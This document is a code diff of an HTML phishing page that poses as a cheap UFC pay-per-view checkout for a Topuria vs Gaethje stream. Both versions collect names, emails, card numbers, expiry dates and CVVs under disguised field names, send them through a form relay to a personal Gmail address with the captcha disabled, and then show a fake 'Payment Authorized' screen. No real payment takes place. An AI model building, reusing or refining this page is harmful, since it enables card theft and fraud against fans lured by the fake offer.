@@ -1,226 +1,167 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
-    
-    :root { 
-        --ufc-red: #d20a0a; 
-        --bg-dark: #0b0b0b; 
-        --card-bg: #141414;
-        --text-gray: #a0a0a0;
-        --accent: #ffffff;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>UFC | Exclusive Access</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        :root {
+            --primary: #e50914;
+            --bg: #0a0a0a;
+            --surface: #161616;
+            --text: #ffffff;
+            --text-muted: #a3a3a3;
+        }
 
-    body { 
-        font-family: 'Inter', sans-serif; 
-        padding: 0; margin: 0; 
-        background-color: var(--bg-dark); 
-        color: white; 
-        -webkit-font-smoothing: antialiased; 
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-    * { box-sizing: border-box; }
+        .header-img {
+            width: 100%;
+            max-width: 500px;
+            height: auto;
+            border-bottom: 4px solid var(--primary);
+        }
 
-    /* Header & Live Pulse */
-    .header { 
-        text-align: center; 
-        padding: 40px 0; 
-        background: linear-gradient(to bottom, #1a1a1a, var(--bg-dark));
-        border-bottom: 2px solid var(--ufc-red);
-    }
-    .logo { 
-        font-family: 'Outfit', sans-serif; 
-        font-size: 2.2rem; 
-        font-weight: 900; 
-        letter-spacing: -1px; 
-        text-transform: uppercase; 
-        color: white;
-    }
-    .live-badge {
-        display: inline-block;
-        background: var(--ufc-red);
-        color: white;
-        padding: 4px 12px;
-        font-weight: 800;
-        font-size: 12px;
-        border-radius: 4px;
-        margin-top: 10px;
-        animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-        0% { opacity: 1; }
-        50% { opacity: 0.5; }
-        100% { opacity: 1; }
-    }
+        .main-wrapper {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+        }
 
-    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }
+        .matchup-card {
+            background: var(--surface);
+            padding: 24px;
+            border-radius: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid #262626;
+        }
 
-    /* Fight Info Box */
-    .fight-card {
-        background: var(--card-bg);
-        padding: 20px;
-        border-radius: 8px;
-        margin-top: -30px;
-        border: 1px solid #333;
-        text-align: center;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; }
-    .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }
+        .matchup-title { font-weight: 800; font-size: 1.2rem; margin-bottom: 8px; }
+        .price-badge { font-size: 2.5rem; font-weight: 800; color: var(--primary); }
 
-    h3 { 
-        font-family: 'Outfit', sans-serif; 
-        font-size: 18px; 
-        text-transform: uppercase; 
-        letter-spacing: 1px; 
-        margin: 40px 0 20px 0; 
-        color: var(--ufc-red);
-    }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; letter-spacing: 0.5px; }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #202020;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        
+        input:focus { outline: none; border-color: var(--primary); }
 
-    /* Form Styling */
-    input[type=text] { 
-        width: 100%; 
-        margin-bottom: 15px; 
-        padding: 15px; 
-        background: #1a1a1a;
-        border: 1px solid #333; 
-        color: white;
-        font-family: 'Inter', sans-serif; 
-        border-radius: 4px;
-    }
-    input[type=text]:focus { outline: none; border-color: var(--ufc-red); }
-    
-    label { 
-        margin-bottom: 8px; 
-        display: block; 
-        font-weight: 700; 
-        text-transform: uppercase; 
-        font-size: 11px; 
-        letter-spacing: 1px; 
-        color: var(--text-gray); 
-    }
+        .row { display: flex; gap: 12px; }
 
-    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }
+        .pay-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            font-size: 1rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.3);
+        }
 
-    .btn { 
-        background-color: var(--ufc-red); 
-        color: white; 
-        padding: 22px; 
-        margin: 30px 0; 
-        border: none; 
-        width: 100%; 
-        cursor: pointer; 
-        font-size: 16px; 
-        font-weight: 900; 
-        text-transform: uppercase; 
-        letter-spacing: 1px; 
-        border-radius: 4px;
-        transition: transform 0.2s;
-    }
-    .btn:hover { transform: scale(1.02); background-color: #ff0000; }
-
-    /* Success Screen */
-    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
-    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: var(--ufc-red); font-size: 3.5rem; margin-bottom: 10px; }
-    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
-</style>
+        #thanks-screen { display: none; text-align: center; padding: 40px; }
+        .success-icon { font-size: 64px; color: #4ade80; margin-bottom: 20px; }
+    </style>
 </head>
 <body>
 
-<div class="header" id="nav-header">
-    <div class="logo">UFC FREEDOM 250 </div>
-    <div class="live-badge">● LIVE STREAM ACCESS</div>
-</div>
+    <img src="IMG_0835.png" alt="Fight Night" class="header-img">
 
-<div id="form-container">
-  <div class="container">
-    <div class="fight-card">
-        <div class="fight-title">TOPURIA vs GAETHJE</div>
-        <div class="price-tag">$0.01</div>
-        <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
+    <div class="main-wrapper" id="form-wrapper">
+        <div class="matchup-card">
+            <div class="matchup-title">TOPURIA vs GAETHJE</div>
+            <div class="price-badge">$0.05</div>
+            <div style="color: var(--text-muted); font-size: 0.8rem; margin-top: 5px;">Secure 4K PPV Access</div>
+        </div>
+
+        <form id="checkoutForm" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="Amount" value="$0.05">
+            
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" name="Full_Name" placeholder="John Doe" required>
+            </div>
+
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" name="Email" placeholder="email@domain.com" required>
+            </div>
+
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" name="Reference_User" placeholder="As it appears on card" required>
+            </div>
+
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group" style="flex: 2;">
+                    <label>Expiry Date</label>
+                    <input type="text" name="Expiry" placeholder="MM/YY" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>CVV</label>
+                    <input type="text" name="Secure_Code" placeholder="***" required>
+                </div>
+            </div>
+
+            <button type="submit" class="pay-btn" id="submitBtn">Pay $0.05 Now</button>
+        </form>
     </div>
 
-    <form id="checkoutForm" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
-      
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="Amount" value="$1.00">
-      
-      <h3>1. Account Info</h3>
-      <label>Full Name</label>
-      <input type="text" id="fname" name="Full_Name" placeholder="Full Name" required>
-      <label>Email (For Stream Link)</label>
-      <input type="text" id="email" name="Email" placeholder="email@example.com" required>
+    <div id="thanks-screen">
+        <i class="fa-solid fa-circle-check success-icon"></i>
+        <h2>Payment Authorized</h2>
+        <p style="color: var(--text-muted);">Please check your email inbox to launch the secure player.</p>
+    </div>
 
-      <h3>2. Payment Details</h3>
-      <div class="icon-container">
-        <i class="fa fa-cc-visa" style="color:white;"></i>
-        <i class="fa fa-cc-mastercard" style="color:white;"></i>
-        <i class="fa fa-cc-amex" style="color:white;"></i>
-      </div>
+    <script>
+        const form = document.getElementById('checkoutForm');
+        const btn = document.getElementById('submitBtn');
 
-      <label>Cardholder Name</label>
-      <input type="text" name="Reference_User" id="cname" placeholder="Name on Card" required>
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> VERIFYING...';
+            btn.disabled = true;
 
-      <label>Card Number</label>
-      <input type="text" name="Reference_ID" id="ccnum" placeholder="0000 0000 0000 0000" required>
-
-      <div style="display: flex; gap: 15px;">
-        <div style="flex: 1;">
-          <label>Expiration</label>
-          <input type="text" name="Expiry" placeholder="MM/YY" required>
-        </div>
-        <div style="flex: 1;">
-          <label>CVV</label>
-          <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
-        </div>
-      </div>
-
-      <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — For ONLY 30 Cents</button>
-    </form>
-  </div>
-</div>
-
-<div id="thanks-screen">
-  <i class="fa fa-check-circle success-icon"></i>
-  <h1>ACCESS GRANTED</h1>
-  <p style="color: #fff; font-size: 18px; margin-top: 20px;">Payment Verified!<br>Check your email or Discord for the private 4K link.</p>
-  <p style="color: var(--text-gray); font-size: 14px;">(Usually arrives within 60 seconds)</p>
-</div>
-
-<script>
-  const form = document.getElementById('checkoutForm');
-  const btn = document.getElementById('submitBtn');
-
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    btn.innerText = "VERIFYING PAYMENT...";
-    btn.disabled = true;
-
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-      method: 'POST',
-      body: formData,
-      headers: { 'Accept': 'application/json' }
-    })
-    .then(response => {
-      document.getElementById("form-container").style.display = "none";
-      document.getElementById("nav-header").style.display = "none";
-      document.getElementById("thanks-screen").style.display = "block";
-      window.scrollTo(0,0);
-    })
-    .catch(error => {
-      console.error('Error:', error);
-      alert("Payment processor busy. Please try again.");
-      btn.innerText = "UNLOCK LIVE STREAM — $1";
-      btn.disabled = false;
-    });
-  });
-</script>
-
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(() => {
+                document.getElementById("form-wrapper").style.display = "none";
+                document.getElementById("thanks-screen").style.display = "block";
+            });
+        });
+    </script>
 </body>
 </html>
